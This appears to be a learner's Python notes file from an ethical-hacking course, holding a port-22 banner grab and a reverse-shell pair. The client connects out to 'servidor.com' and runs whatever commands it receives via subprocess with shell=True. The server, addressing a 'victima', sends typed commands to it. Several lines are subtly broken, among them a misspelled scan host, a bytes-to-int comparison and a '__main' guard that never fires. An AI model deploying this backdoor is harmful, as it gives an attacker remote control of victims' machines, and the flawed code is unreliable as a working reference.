#https://www.udemy.com/course/python-de-0-hasta-hacking/learn/lecture/12050292#overview
import socket

s = socket.socket()

try:
    s.connect(("scannme.namp.org",22)) #al conectarnos a este host al pto 22 recibiremos un banner de bienvenida
    banner = s.recv(1024)
    print(banner)
except:
    print("error en la conxion")


#https://www.udemy.com/course/python-de-0-hasta-hacking/learn/lecture/12050296#overview
###lado del servidor
import socket

def main():
    server=socket.socket()
    server.bind(('localhost',7777)) #monto un servicio en ese puerto
    server.listen(1) #le pongo a la escucha

    while True: #esperamos a que la victima se conecte
        victima,direccion =server.accept()
        print('Conexion de: {}'.format(direccion))
        ver = victima.recv(1024)
        if ver == 1:
            while True:
                opcion = raw_input("shell@shell") #comando a enviar a la victima
                victima.send(opcion)
                resultado = victima.recv(2048)
                print(resultado)

if __name__ == '__main':
    try:
        main()
    except KeyboardInterrupt:
        exit()

###lado del cliente
import socket
import subprocess

cliente = socket.socket()

try:
    cliente.connect(('servidor.com',7777))
    cliente.send("1") #enviamos un 1 al servidor

    while True:
        c = cliente.recv(1024)
        comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if comando.stderr.read() != "":
            cliente.send("error de comando")
        else:
            cliente.send(comando.stdout.read())
except:
    pass